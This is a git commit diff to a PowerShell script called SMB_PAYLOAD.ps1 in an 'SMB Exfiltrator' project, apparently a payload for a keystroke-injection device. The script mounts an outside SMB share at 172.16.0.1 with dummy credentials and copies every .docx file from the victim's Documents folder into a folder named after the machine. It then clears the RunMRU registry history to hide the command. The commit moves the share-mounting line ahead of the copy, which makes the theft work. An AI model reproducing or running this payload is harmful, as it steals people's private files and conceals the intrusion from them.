30ccda08971e6c9569611d36be4d267ff6c0329c
akhil1136 <47243201+akhil1136@users.noreply.github.com>
2019-02-13 00:47:05 +0530

    Update SMB_PAYLOAD.ps1

--- SMB Exfiltrator/SMB_PAYLOAD.ps1
+++ SMB Exfiltrator/SMB_PAYLOAD.ps1
@@ -1,7 +1,7 @@
 $exfil_dir="$Env:UserProfile\Documents"
 $exfil_ext="*.docx"
 $loot_dir="\\172.16.0.1\Data\$Env:ComputerName\$((Get-Date).ToString('yyyy-MM-dd_hhmmtt'))"
+net use \\172.16.0.1\Data /USER:any any;
 mkdir $loot_dir
 robocopy $exfil_dir $loot_dir $exfil_ext /S /MT /Z
-net use \\172.16.0.1\Data /USER:any any;
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
